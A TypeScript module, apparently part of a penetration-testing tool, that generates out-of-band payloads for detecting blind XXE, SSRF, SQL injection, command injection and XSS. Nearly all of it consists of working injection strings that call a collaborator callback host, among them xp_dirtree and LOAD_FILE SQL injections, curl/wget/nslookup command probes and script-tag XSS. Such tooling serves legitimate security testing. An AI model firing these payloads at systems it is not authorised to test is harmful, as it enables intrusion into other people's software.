/**
 * BugTrace-AI OOB Helper
 * Out-of-band interaction payloads for blind vulnerability detection
 * @module payload/oob-helper
 */

export type OOBType = 'dns' | 'http' | 'https' | 'smtp' | 'ldap';
export type VulnType = 'xxe' | 'ssrf' | 'sqli' | 'rce' | 'xss';

export interface OOBPayload {
  type: OOBType;
  vulnType: VulnType;
  payload: string;
  callback: string;
  description: string;
}

export interface OOBConfig {
  domain: string;
  protocol?: OOBType;
  uniqueId?: string;
}

/**
 * OOBHelper - Generate out-of-band interaction payloads
 */
export class OOBHelper {
  private domain: string;
  private uniqueId: string;

  constructor(config: OOBConfig) {
    this.domain = config.domain || 'burpcollaborator.net';
    this.uniqueId = config.uniqueId || this.generateUniqueId();
  }

  /**
   * Generate OOB payloads for vulnerability testing
   */
  generate(vulnType: VulnType, protocol?: OOBType): OOBPayload[] {
    const payloads: OOBPayload[] = [];

    switch (vulnType) {
      case 'xxe':
        payloads.push(...this.generateXXE(protocol));
        break;
      case 'ssrf':
        payloads.push(...this.generateSSRF(protocol));
        break;
      case 'sqli':
        payloads.push(...this.generateSQLi(protocol));
        break;
      case 'rce':
        payloads.push(...this.generateRCE(protocol));
        break;
      case 'xss':
        payloads.push(...this.generateXSS(protocol));
        break;
    }

    return payloads;
  }

  /**
   * XXE OOB payloads
   */
  private generateXXE(protocol?: OOBType): OOBPayload[] {
    const callback = this.getCallback('xxe', protocol || 'http');

    return [
      {
        type: 'http',
        vulnType: 'xxe',
        callback,
        payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://${callback}"> ]>
<root>&xxe;</root>`,
        description: 'Basic XXE with HTTP callback'
      },
      {
        type: 'dns',
        vulnType: 'xxe',
        callback: this.getCallback('xxe', 'dns'),
        payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://${this.getCallback('xxe', 'dns')}"> %xxe; ]>`,
        description: 'XXE with DNS exfiltration'
      }
    ];
  }

  /**
   * SSRF OOB payloads
   */
  private generateSSRF(protocol?: OOBType): OOBPayload[] {
    const callback = this.getCallback('ssrf', protocol || 'http');

    return [
      {
        type: 'http',
        vulnType: 'ssrf',
        callback,
        payload: `http://${callback}`,
        description: 'Basic SSRF HTTP callback'
      },
      {
        type: 'dns',
        vulnType: 'ssrf',
        callback: this.getCallback('ssrf', 'dns'),
        payload: `http://${this.getCallback('ssrf', 'dns')}`,
        description: 'SSRF DNS callback'
      }
    ];
  }

  /**
   * Blind SQLi OOB payloads
   */
  private generateSQLi(protocol?: OOBType): OOBPayload[] {
    const callback = this.getCallback('sqli', protocol || 'dns');

    return [
      {
        type: 'dns',
        vulnType: 'sqli',
        callback,
        payload: `' OR 1=1; EXEC master..xp_dirtree '//${callback}/a'--`,
        description: 'SQL Server DNS exfiltration via xp_dirtree'
      },
      {
        type: 'http',
        vulnType: 'sqli',
        callback: this.getCallback('sqli', 'http'),
        payload: `' UNION SELECT LOAD_FILE('http://${this.getCallback('sqli', 'http')}')--`,
        description: 'MySQL HTTP callback via LOAD_FILE'
      }
    ];
  }

  /**
   * RCE OOB payloads
   */
  private generateRCE(protocol?: OOBType): OOBPayload[] {
    const callback = this.getCallback('rce', protocol || 'http');

    return [
      {
        type: 'http',
        vulnType: 'rce',
        callback,
        payload: `curl http://${callback}`,
        description: 'RCE verification via curl'
      },
      {
        type: 'dns',
        vulnType: 'rce',
        callback: this.getCallback('rce', 'dns'),
        payload: `nslookup ${this.getCallback('rce', 'dns')}`,
        description: 'RCE verification via DNS lookup'
      },
      {
        type: 'http',
        vulnType: 'rce',
        callback,
        payload: `wget http://${callback}`,
        description: 'RCE verification via wget'
      }
    ];
  }

  /**
   * XSS OOB payloads
   */
  private generateXSS(protocol?: OOBType): OOBPayload[] {
    const callback = this.getCallback('xss', protocol || 'http');

    return [
      {
        type: 'http',
        vulnType: 'xss',
        callback,
        payload: `<img src="http://${callback}">`,
        description: 'XSS verification via image tag'
      },
      {
        type: 'http',
        vulnType: 'xss',
        callback,
        payload: `<script src="http://${callback}"></script>`,
        description: 'XSS verification via script tag'
      }
    ];
  }

  /**
   * Get callback URL
   */
  private getCallback(vulnType: string, protocol: OOBType): string {
    return `${this.uniqueId}.${vulnType}.${protocol}.${this.domain}`;
  }

  /**
   * Generate unique ID
   */
  private generateUniqueId(): string {
    return Math.random().toString(36).substring(2, 15) +
           Math.random().toString(36).substring(2, 15);
  }

  /**
   * Check for interactions (placeholder)
   */
  async checkInteractions(): Promise<{ received: boolean; data?: any }> {
    // Placeholder - would check actual OOB service
    return { received: false };
  }

  /**
   * Generate report
   */
  generateReport(payloads: OOBPayload[]): string {
    let report = '═══════════════════════════════════════════════════════\n';
    report += '            OOB HELPER REPORT\n';
    report += '═══════════════════════════════════════════════════════\n\n';

    report += `Domain: ${this.domain}\n`;
    report += `Unique ID: ${this.uniqueId}\n`;
    report += `Total Payloads: ${payloads.length}\n\n`;

    payloads.forEach((payload, index) => {
      report += `[${index + 1}] ${payload.vulnType.toUpperCase()} - ${payload.type.toUpperCase()}\n`;
      report += `Description: ${payload.description}\n`;
      report += `Callback: ${payload.callback}\n`;
      report += `Payload:\n${payload.payload}\n`;
      report += '-'.repeat(60) + '\n';
    });

    return report;
  }
}

export default OOBHelper;
